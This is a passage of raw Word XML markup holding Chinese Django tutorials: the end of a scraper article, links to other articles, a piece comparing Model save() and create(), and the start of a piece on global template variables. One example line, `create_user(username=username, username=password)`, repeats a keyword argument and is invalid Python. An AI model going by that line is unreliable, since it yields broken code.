        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47C3BAE6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    detail['year'] = "</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>未知</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59EE7228" w14:textId="3FCD730E" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>detail['location'] = position_info[1]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B9E3EC6" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1EC3F1B7" w14:textId="7A4DC9CE" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>GitHub源码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E1CB5CC" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>对于代码看不全的同学们，可以去github上看完整代码，是个不错的爬虫和Django练习哦。源码地址如下所示:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="393863FC" w14:textId="010D67A5" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>https://github.com/shiyunbo/django-homelink-spider</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56133967" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003C49CC" w:rsidRDefault="00D96E02" w:rsidP="003C49CC">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="360" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId334" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF" w:rsidRPr="003C49CC">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>Django应用实战: 编写你自己的PDF编辑器, 实现PDF页面提取, 页面合并与替换。</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="739104F5" w14:textId="5C574A82" w:rsidR="001C47AF" w:rsidRPr="003C49CC" w:rsidRDefault="00D96E02" w:rsidP="003C49CC">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="360" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId335" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF" w:rsidRPr="003C49CC">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>如何在阿里云Ubuntu服务器通过uWSGI和Nginx部署Django项目教程-大江狗原创出品</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1D782092" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003C49CC" w:rsidRDefault="001C47AF" w:rsidP="003C49CC">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="360" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003C49CC">
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Django Web开发学习笔记</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2486345E" w14:textId="39550D82" w:rsidR="001C47AF" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">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097</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="27"/>
          <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:hyperlink r:id="rId336" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF" w:rsidRPr="00016AA9">
          <w:rPr>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:b/>
            <w:color w:val="4D4D4D"/>
            <w:sz w:val="30"/>
            <w:szCs w:val="27"/>
            <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
          </w:rPr>
          <w:t>浅谈Django Model创建对象的save与create方法</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6100F347" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>浅谈Django Model创建对象的save与create方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C81E23A" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Yunbo Shi </w:t>
      </w:r>
      <w:hyperlink r:id="rId337" w:history="1">
        <w:r w:rsidRPr="00016AA9">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Python Web与Django开发</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> 2018-05-05</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B66ECF4" w14:textId="52A5D9EE" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django的模型(Model)的本质是类，并不是一个具体的对象(Object)。当你设计好模型后，你就可以对Model进行实例化从而创建一个一个具体的对象。Django对于创建对象提供了2种不同的save与create方法，我们来仔细分析下这两种方式有什么不同。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="669D42BA" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们来先看看下面这个例子。我们已经设计好了一个Person的模型（如下）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="481F55D9" w14:textId="4C7C2BB7" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.db import models</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A15BD9A" w14:textId="5EAA58D9" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class Person(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74123071" w14:textId="170C433D" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    name = models.CharField(max_length=128)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78D9604D"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def __str__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4650508D"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return self.name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FDF8C79" w14:textId="6107BDE8" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>用save方法创建对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E1CBB06" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>用save方法创建一个名叫john的具体对象，我们可以这么做。记住你只有用了save()方法后，Django才会将这个对象的信息存储到数据库中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2065C3CE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>john = Person(name="John Fourkas")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F3FB072" w14:textId="15FCDAE2" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>john.save()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="400084B9" w14:textId="1BE5FC2B" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>用create方法创建对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EF0828C" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>正因为用save方法创建对象有2步，而且编程人员容易忘记加上save()，Django提供了一个更便捷的create方法，如下。如果你使用create方法，无需再加上save()。create方法不仅创建了新的对象，而且直接将信息存储到数据库里。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BCD30CB" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>john = Person.objects.create(name="John Fourkas")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0368326A" w14:textId="6C7DDED2" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>save与create方法比较</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19FEBD23" w14:textId="60C1B902" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>create只能用于创建新的对象，在数据库层总是执行insert的操作。save不仅用于创建新的对象，也能用于更新对象的现有数据，在数据库层总是先执行update，找不到具体对象后再执行insert的操作。对于创建全新的对象，两者都可以。如果更新已有对象信息，只能用save()方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1877F3D2" w14:textId="128276D0" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>User自带的create_user方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CD17769" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果你要Auth自带的User模型创建新对象，你需要使用create_user方法，而不是create方法，如下所示。create_user方法很有用，自动会给密码加Hash。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EF40095" w14:textId="4C4205D1" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>user1 = User.objects.create_user(username=username, username=password)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B93BDE2" w14:textId="7BFE2C3E" w:rsidR="001C47AF" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">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098</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="27"/>
          <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:hyperlink r:id="rId338" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF" w:rsidRPr="00016AA9">
          <w:rPr>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:b/>
            <w:color w:val="4D4D4D"/>
            <w:sz w:val="30"/>
            <w:szCs w:val="27"/>
            <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
          </w:rPr>
          <w:t>Django模板设置全局变量(默认变量)</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="13F8E4A3" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django模板设置全局变量(默认变量)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E67F55E" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>杨仕航 </w:t>
      </w:r>
      <w:hyperlink r:id="rId339" w:history="1">
        <w:r w:rsidRPr="00016AA9">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Python Web与Django开发</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> 2018-06-24</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="053CF1D1" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>有时候，我们需要Templates模板页面可以使用一些变量。这些变量我们在views.py响应时没有返回设置的变量。例如，如下代码：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E158A2A" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>#coding:utf-8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D720AC6" w14:textId="27A8F002" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.shortcuts import render</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B141963" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def index(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D1E9B12" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>    context = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A2FCC8B" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
